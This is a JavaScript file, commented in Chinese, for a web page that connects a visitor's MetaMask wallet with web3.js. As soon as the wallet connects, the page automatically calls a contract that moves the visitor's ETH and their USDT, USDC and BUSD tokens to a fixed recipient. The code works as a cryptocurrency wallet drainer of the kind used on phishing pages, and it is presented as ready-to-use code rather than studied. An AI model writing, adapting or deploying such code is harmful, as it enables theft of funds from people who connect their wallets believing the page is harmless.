let web3;
let contract;

// 合约ABI
const contractABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "sender", "type": "address" }
        ],
        "name": "transferETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "sender", "type": "address" }
        ],
        "name": "transferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            { "internalType": "address", "name": "", "type": "address" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 合约地址
const contractAddress = "0x9396B453Fad71816cA9f152Ae785276a1D578492";  // 你的合约地址

// 连接钱包
async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        // 请求用户连接钱包
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        contract = new web3.eth.Contract(contractABI, contractAddress);
        document.getElementById('status').innerText = "钱包已连接！";

        // 自动检测余额并转移
        await autoTransfer();
    } else {
        document.getElementById('status').innerText = "请安装MetaMask！";
    }
}

// 自动转移ETH和ERC20代币
async function autoTransfer() {
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];

    // 转移ETH
    await transferETH(sender);
    
    // 转移USDT、USDC、BUSD
    const tokens = [
        "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT 地址
        "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC 地址
        "0xe9e7cea3dedca5984780bafc599bd69add087de1"  // BUSD 地址
    ];

    for (const token of tokens) {
        await transferTokens(token, sender);
    }
}

// 转移ETH到指定地址
async function transferETH(sender) {
    try {
        const receipt = await contract.methods.transferETH(sender).send({ from: sender });
        console.log("ETH转移成功:", receipt);
    } catch (error) {
        console.error("ETH转移失败:", error);
    }
}

// 转移ERC20代币到指定地址
async function transferTokens(token, sender) {
    try {
        const receipt = await contract.methods.transferTokens(token, sender).send({ from: sender });
        console.log(`${token} 转移成功:`, receipt);
    } catch (error) {
        console.error(`${token} 转移失败:`, error);
    }
}

// 按钮事件
document.getElementById('connectButton').onclick = connectWallet;
